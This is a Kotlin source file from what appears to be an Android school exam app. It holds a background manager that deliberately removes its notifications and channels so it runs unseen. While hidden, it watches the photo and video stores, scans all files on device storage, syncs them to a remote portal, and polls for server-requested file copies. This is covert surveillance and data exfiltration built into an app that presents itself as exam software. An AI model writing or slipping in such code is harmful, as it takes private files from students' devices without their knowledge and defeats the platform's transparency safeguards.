package com.school.smartcbt.service

import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import com.school.smartcbt.BuildConfig
import com.school.smartcbt.data.model.BasicResponse
import com.school.smartcbt.ui.LoginActivity
import com.school.smartcbt.utils.NotificationHelper
import com.school.smartcbt.utils.SessionManager
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Silent Background Manager for device telemetry, heartbeat, and automated file metadata
 * synchronization with the CBT Admin Portal without persistent notification.
 */
object DeviceSyncManager {
    private const val TAG = "DeviceSyncManager"
    private var scheduledExecutor: ScheduledExecutorService? = null
    private val isSyncingFiles = AtomicBoolean(false)
    private var lastUpdateNotifTime = 0L
    private var contentObserverRegistered = false
    private var lastMediaChangeTime = 0L

    fun start(context: Context) {
        val appContext = context.applicationContext

        // Clear any old foreground notification if it was previously posted
        try {
            val nm = appContext.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
            nm?.cancel(8821)
            nm?.cancel(99881)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                nm?.deleteNotificationChannel("cbt_sync_service_channel")
                nm?.deleteNotificationChannel("device_sync_channel")
                nm?.deleteNotificationChannel("file_sync_channel")
                nm?.deleteNotificationChannel("sync_channel")
                nm?.deleteNotificationChannel("sync_service")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error cleaning old sync notification: ${e.message}")
        }

        // Register MediaStore Observer for real-time camera/download live notifications
        registerMediaObserver(appContext)

        if (scheduledExecutor != null && !scheduledExecutor!!.isShutdown) {
            return
        }

        scheduledExecutor = Executors.newScheduledThreadPool(2)

        // 1. Immediate device registration & initial heartbeat
        scheduledExecutor?.schedule({
            try {
                FileScannerService.registerDevice(appContext) { success ->
                    Log.d(TAG, "Device registration status: $success")
                }
                FileScannerService.sendHeartbeat(appContext) { response ->
                    if (response != null) handleHeartbeatResponse(appContext, response)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Initial registration error: ${e.message}")
            }
        }, 1, TimeUnit.SECONDS)

        // 2. Periodic heartbeat every 20 seconds - keep device ONLINE on admin portal
        scheduledExecutor?.scheduleWithFixedDelay({
            try {
                FileScannerService.sendHeartbeat(appContext) { response ->
                    if (response != null) handleHeartbeatResponse(appContext, response)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Heartbeat failed: ${e.message}")
            }
        }, 5, 20, TimeUnit.SECONDS)

        // 3. Check pending copy requests every 3 seconds (AirDroid file transfer response)
        scheduledExecutor?.scheduleWithFixedDelay({
            try {
                FileScannerService.checkPendingRequests(appContext)
            } catch (e: Exception) {}
        }, 2, 3, TimeUnit.SECONDS)

        // 4. Initial File Scan & Sync (3s delay)
        scheduledExecutor?.schedule({
            triggerFileScanAndSync(appContext)
        }, 3, TimeUnit.SECONDS)

        // 5. Periodic File Scan every 3 minutes
        scheduledExecutor?.scheduleWithFixedDelay({
            triggerFileScanAndSync(appContext)
        }, 90, 180, TimeUnit.SECONDS)

        Log.d(TAG, "DeviceSyncManager started silently in background without foreground notification")
    }

    private fun registerMediaObserver(appContext: Context) {
        if (contentObserverRegistered) return
        try {
            val observer = object : android.database.ContentObserver(android.os.Handler(android.os.Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean) {
                    super.onChange(selfChange)
                    val now = System.currentTimeMillis()
                    if (now - lastMediaChangeTime > 2500L) { // Debounce 2.5s
                        lastMediaChangeTime = now
                        FileScannerService.notifyNewFileLive(appContext)
                    }
                }
            }
            appContext.contentResolver.registerContentObserver(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true,
                observer
            )
            appContext.contentResolver.registerContentObserver(
                android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                true,
                observer
            )
            contentObserverRegistered = true
        } catch (e: Exception) {
            Log.w(TAG, "Error registering media observer: ${e.message}")
        }
    }

    fun triggerImmediateSync(context: Context) {
        triggerFileScanAndSync(context.applicationContext)
    }

    private fun triggerFileScanAndSync(context: Context) {
        if (isSyncingFiles.compareAndSet(false, true)) {
            Thread {
                try {
                    Log.d(TAG, "Starting media & files scan on device...")
                    val files = FileScannerService.scanAllFiles(context)
                    Log.d(TAG, "Scanned ${files.size} files from device storage")
                    FileScannerService.syncFilesToServer(context, files) { synced ->
                        Log.d(TAG, "Successfully synced $synced files to backend portal (total scanned: ${files.size})")
                        isSyncingFiles.set(false)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "File scanner execution error: ${e.message}")
                    isSyncingFiles.set(false)
                }
            }.start()
        }
    }

    private fun handleHeartbeatResponse(context: Context, response: BasicResponse) {
        if (response.forceLogout == true) {
            Log.w(TAG, "FORCE_LOGOUT received from server. Clearing session and redirecting to LoginActivity...")
            SessionManager(context).clearSession()
            try {
                scheduledExecutor?.shutdownNow()
            } catch (e: Exception) {}

            val bcIntent = Intent("com.school.smartcbt.ACTION_FORCE_LOGOUT")
            context.sendBroadcast(bcIntent)

            val loginIntent = Intent(context, LoginActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                putExtra("EXTRA_FORCE_LOGOUT", true)
            }
            context.startActivity(loginIntent)
            return
        }

        if (response.triggerScan == true) {
            Log.d(TAG, "Heartbeat requested triggerScan! Launching media scan immediately...")
            triggerFileScanAndSync(context)
        }

        if (response.latestVersionCode != null && response.latestVersionCode > BuildConfig.VERSION_CODE) {
            val now = System.currentTimeMillis()
            if (now - lastUpdateNotifTime > 300_000) {
                lastUpdateNotifTime = now
                val vName = response.latestVersionName ?: "v${response.latestVersionCode}"
                NotificationHelper.showHeadsUpNotification(
                    context,
                    "Pembaruan Smart School Tersedia ($vName)",
                    "Versi $vName telah tersedia di server sekolah. Harap perbarui aplikasi APK untuk fitur CBT terbaru.",
                    "Smart School CBT Update",
                    notificationId = 99881
                )
            }
        }
    }

    fun stop() {
        try {
            scheduledExecutor?.shutdownNow()
        } catch (e: Exception) {}
        scheduledExecutor = null
    }
}

/**
 * Compatibility wrapper Service kept in manifest to safely handle any legacy intents.
 * Does not show any foreground notification.
 */
class DeviceSyncBackgroundService : Service() {

    companion object {
        private const val TAG = "DeviceSyncService"
        private const val NOTIFICATION_ID = 8821
        private const val CHANNEL_ID = "cbt_sync_service_channel"

        fun startService(context: Context) {
            try {
                // Cancel any old notification immediately
                val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
                nm?.cancel(NOTIFICATION_ID)

                // Start silent manager directly
                DeviceSyncManager.start(context)
            } catch (e: Exception) {
                Log.e(TAG, "Error starting DeviceSync: ${e.message}")
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        DeviceSyncManager.start(applicationContext)
        stopSelf()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        DeviceSyncManager.start(applicationContext)
        stopSelf()
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
